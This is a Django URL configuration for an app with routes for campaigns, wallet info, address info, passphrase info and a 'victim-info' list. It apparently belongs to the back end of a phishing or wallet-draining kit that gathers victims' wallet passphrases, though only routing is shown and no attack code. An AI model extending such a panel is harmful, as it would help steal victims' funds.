from django.urls import path
from . import views

app_name = 'core'

urlpatterns = [
    path('', views.index, name='index'),
    path('create-campaign/', views.create_campaign, name='create_campaign'),
    path('create-multi-campaign/', views.create_multi_campaign, name='create_multi_campaign'),
    path('campaigns/<uuid:uuid>/', views.campaign_detail, name='campaign_detail'),  # URL using UUID
    path('wallet-info/', views.wallet_info, name='wallet_info'),
    path('address-info/', views.address_info, name='address_info'),
    path('passphrase-info/', views.passphrase_info, name='passphrase_info'),
    path('victim-info/', views.victim_info_list, name='victim_info_list'),
]
